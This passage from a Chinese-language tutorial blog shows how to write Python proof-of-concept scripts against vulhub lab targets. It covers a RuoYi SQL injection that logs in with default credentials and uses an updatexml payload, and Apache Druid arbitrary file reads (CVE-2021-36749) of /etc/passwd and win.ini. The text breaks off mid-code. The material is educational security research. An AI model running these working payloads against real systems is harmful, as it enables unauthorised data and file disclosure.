class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vul target cookie&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--validateCode&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please inpute the verification code&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;--bgurl&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please inpute the Login background vulnerable url&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化 parser</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置banner，用于正确运行脚本时输出</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> _____                   _    _____       _   _____       _           _   _             </span></span><br><span class="line"><span class="string">|  __ \                 (_)  / ____|     | | |_   _|     (_)         | | (_)            </span></span><br><span class="line"><span class="string">| |__) |   _  ___  _   _ _  | (___   __ _| |   | |  _ __  _  ___  ___| |_ _  ___  _ __  </span></span><br><span class="line"><span class="string">|  _  / | | |/ _ \| | | | |  \___ \ / _` | |   | | | &#x27;_ \| |/ _ \/ __| __| |/ _ \| &#x27;_ \ </span></span><br><span class="line"><span class="string">| | \ \ |_| | (_) | |_| | |  ____) | (_| | |  _| |_| | | | |  __/ (__| |_| | (_) | | | |</span></span><br><span class="line"><span class="string">|_|  \_\__,_|\___/ \__, |_| |_____/ \__, |_| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|</span></span><br><span class="line"><span class="string">                    __/ |              | |              _/ |                            </span></span><br><span class="line"><span class="string">                   |___/               |_|             |__/                             </span></span><br><span class="line"><span class="string">                                                                                 v 4.6.0 </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># url、cookie、validateCode(验证码) ， bgurl 值为后台 sql 注入的漏洞链接,均改为命令行参数输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url,cookie,validateCode,bgurl</span>):</span><br><span class="line">    <span class="comment"># 设置 Headers 可以模拟浏览器发送HTTP请求，避免被拦截，并携带 Cookie 值进行请求,Cookie值从命令行参数传入</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造 POST 数据包，参数与用户输入的参数值分别用单引号或者双引号括起来且中间使用 : 分隔开, validateCode 值从命令行参数传入</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:&#123;validateCode&#125;,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用 request 请求登陆</span></span><br><span class="line">    res = requests.post(url, headers=headers, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一层 if、elif 作为处理登陆成功或失败返回的响应，第二层 if 用于验证漏洞，若返回的响应中存在 &quot;操作成功&quot; 则进行下一步操作，否则跳出</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;操作成功&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="comment"># 继上一步的登陆后，构造登陆后的数据请求 URL,漏洞 url 通过 bgurl（-u）-&gt; post_url 传入</span></span><br><span class="line">        post_url = bgurl</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造登陆后的漏洞点的数据 POST 请求包</span></span><br><span class="line">        post_data = &#123;<span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;orderByColumn&#x27;</span>: <span class="string">&#x27;roleSort&#x27;</span>, <span class="string">&#x27;isAsc&#x27;</span>: <span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;roleName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;roleKey&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BbeginTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BendTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;params[dataScope]&#x27;</span>: <span class="string">&#x27;and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523&#x27;</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 登陆后继续保持 headers 头，这一步很重要，如果没有这一步就无法保持客户端与服务器的连接，继而无法进行后台请求</span></span><br><span class="line">        post_headers = headers</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 开始登录后的后台数据请求</span></span><br><span class="line">        post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 post_requests 数据请求响应存在 &quot;java.sql.SQLException: XPATH syntax error&quot; 则证明存在漏洞，返回 &quot;[+] Vulnerable to SQL injection&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;java.sql.SQLException: XPATH syntax error:&quot;</span> <span class="keyword">in</span> post_requests.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Vulnerable to SQL injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若不存在 &quot;java.sql.SQLException: XPATH syntax error&quot; 则证明存在不漏洞，返回 &quot;[-] Not vulnerable to SQL injection &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Not vulnerable to SQL injection &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;验证码错误&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error Occurred, Please Check you input&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定格式，由于上面代码使用的模块化 def() 编写，所以下面需设置主函数进行执行脚本</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 按照顺序，先执行banner()函数里面的代码，在执行Poc()函数里面的代码，其中Poc()函数代码中的url、cookie、validateCode、bgurl均使用 argparse 库调用，使用命令行参数传入相应的值</span></span><br><span class="line">    banner()</span><br><span class="line">    Poc(args.url,args.cookie,args.validateCode,args.bgurl)</span><br></pre></td></tr></table></figure></div><p>执行脚本存在漏洞时，返回响应 <code>[+] Vulnerable to SQL injection</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u [漏洞的后台登录链接] -c [网站的cookie值] -v [验证码] -b [后台的漏洞点链接]</span><br><span class="line">python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=de1e9f93-9c51-4520-b106-bff2ed0918ae -v 56 -b http://192.168.148.184:8888/system/role/list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144247358.png" data-caption="image-20230522144247358"><img src="/../images/poc/image-20230522144247358.png" alt="image-20230522144247358"></a></p><p>当漏洞不存在时，这里修改漏洞链接测试，返回响应 <code>[-] Not vulnerable to SQL injection </code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=d40bd1c6-40b5-4c6a-ba75-4cbdd0265d4f -v 1 -b http://192.168.148.184:8888/system/menu/list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144440540.png" data-caption="image-20230522144440540"><img src="/../images/poc/image-20230522144440540.png" alt="image-20230522144440540"></a></p><p>当输入的 Cookie 或者 验证码错误时，返回响应 <code>[-] Error Occurred, Please Check you input</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230522144609049.png" data-caption="image-20230522144609049"><img src="/../images/poc/image-20230522144609049.png" alt="image-20230522144609049"></a></p><p>这 Poc 存在一个问题，账号密码的内置的，若不是默认admin&#x2F;admin123，则无法登录，若想要完全自动化，可将登录的账号密码参数加入 <code>argsparse</code>，若能明白这简单的脚本，自己修改很简单，上手敲一遍，加深印象。</p><h2 id="三、任意文件读取"><a href="#三、任意文件读取" class="headerlink" title="三、任意文件读取"></a>三、任意文件读取</h2><h3 id="Apache-Druid-LoadData-任意文件读取漏洞（CVE-2021-36749）"><a href="#Apache-Druid-LoadData-任意文件读取漏洞（CVE-2021-36749）" class="headerlink" title="Apache Druid LoadData 任意文件读取漏洞（CVE-2021-36749）"></a>Apache Druid LoadData 任意文件读取漏洞（CVE-2021-36749）</h3><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vulhub 下载地址</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># 进入 CVE-2021-25646 目录输入命令启动环境</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213053687.png" data-caption="image-20230513213053687"><img src="/../images/poc/image-20230513213053687.png" alt="image-20230513213053687"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213116533.png" data-caption="image-20230513213116533"><img src="/../images/poc/image-20230513213116533.png" alt="image-20230513213116533"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213211212.png" data-caption="image-20230513213211212"><img src="/../images/poc/image-20230513213211212.png" alt="image-20230513213211212"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513213321456.png" data-caption="image-20230513213321456"><img src="/../images/poc/image-20230513213321456.png" alt="image-20230513213321456"></a></p><blockquote><p>影响版本：Apache Druid Version &lt; 0.22</p></blockquote><h4 id="POC-代码编写分析-1"><a href="#POC-代码编写分析-1" class="headerlink" title="POC 代码编写分析"></a>POC 代码编写分析</h4><p>通过 Burp 抓包获取其数据包以及相应的漏洞触发点，由下图可知，漏洞触发参数为 <code>&quot;uris&quot;</code>，我们只需要将该参数的值更改为漏洞 <code>Payload</code> ，当我们观察输出验证的 <code>Payload</code> 返回的响应即可判断是否存在漏洞。</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?for=connect HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.148</span><span class="number">.155</span><span class="punctuation">:</span><span class="number">8888</span></span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">423</span></span><br><span class="line">Accept<span class="punctuation">:</span> application/json<span class="punctuation">,</span> text/plain<span class="punctuation">,</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: application/json;charset=UTF-8</span></span><br><span class="line"><span class="comment">Origin: http://192.168.148.155:8888</span></span><br><span class="line"><span class="comment">Referer: http://192.168.148.155:8888/unified-console.html</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123;&quot;type&quot;:&quot;http&quot;,&quot;uris&quot;:[&quot;file:///etc/passwd&quot;]&#125;,&quot;inputFormat&quot;:&#123;&quot;type&quot;:&quot;regex&quot;,&quot;pattern&quot;:&quot;(.*)&quot;,&quot;columns&quot;:[&quot;raw&quot;]&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,&quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;,&quot;tuningConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;timeoutMs&quot;:15000&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230515180413362.png" data-caption="image-20230515180413362"><img src="/../images/poc/image-20230515180413362.png" alt="image-20230515180413362"></a></p><h4 id="分析小结-1"><a href="#分析小结-1" class="headerlink" title="分析小结"></a>分析小结</h4><p>由于靶场没有登录验证。这一部分我们 pass，若存在登录验证的话可以参考上面 SQL 注入 Poc 编写部分进行再构造。这边就当做为一个前台的或者未授权访问的任意文件读取漏洞去进行 Poc 编写。</p><blockquote><p>1、利用 Post 请求数据包，然后将 uri 参数值编写为用户输入</p><p>2、设置一个漏洞 payload 列表进行遍历，也可以让用户输入特定的验证 payload 验证漏洞</p></blockquote><h4 id="Poc-初步编写-1"><a href="#Poc-初步编写-1" class="headerlink" title="Poc 初步编写"></a>Poc 初步编写</h4><p>初步编写需要注意的点就是 <code>JSON</code> 格式的数据请求问题，此前请求为 <code>requests.post(url,data=data)</code>，但由于本漏洞的请求数据是 <code>json</code> 格式问题，所以得注意请求的设置中 <code>data=data</code> 需要更改为 <code>json=data</code></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回请求的 text ,先手工查看是否存在漏洞</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p>由返回包可知初步编写的 Poc 能正常验证漏洞</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230515191157167.png" data-caption="image-20230515191157167"><img src="/../images/poc/image-20230515191157167.png" alt="image-20230515191157167"></a></p><h4 id="完善代码-1"><a href="#完善代码-1" class="headerlink" title="完善代码"></a>完善代码</h4><p>由上一步我们初步实现的 <code>Poc</code> 的编写，但还是不够自动化，这边主要解决几个点：漏洞 <code>URL</code> 用户手动输入；<code>post</code> 数据参数 <code>uris</code> 的验证 <code>payload </code>太单一，若系统不一样则会出现漏报现象，这边的 <code>Payload</code> 改为已定义的 <code>list</code> 遍历 <code>payload</code>，避免出现漏报；美化代码格式 </p><p>1、首先将原先简陋的代码模块化，定义一个 Poc() 函数处理代码</p><p>原代码</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置漏洞链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="string">&quot;file:///etc/passwd&quot;</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>修改后代码，注意这时候该  Poc 还不能去执行，因为 <code>Poc(url)</code> 中的<code> url</code> 还没有定义，请继续往下看即可</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意这里多了一个Poc(url)，url 第2点下面有提及具体用途</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 自定义一个字典，用于存在验证的 payload，自定义 payload 区别系统版本，避免漏报</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># try except 用于捕抓异常，当用户输入的连接有误时，提示异常</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># for 循环用于遍历 lists 字典中的 payload -&gt; &quot;urls&quot;：[list]</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 若 res 的 response 中存在 root:x 或者 [fonts] 字符则证明存在漏洞否则不存在漏洞</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 Apache Druid LoadData 任意文件读取漏洞 &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 Apache Druid LoadData 任意文件读取漏洞&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 请检查输入是否有误&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 因为代码使用了模块化，所以若需要执行代码则需要利用 main 函数去执行，函数的执行按从上到下执行</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    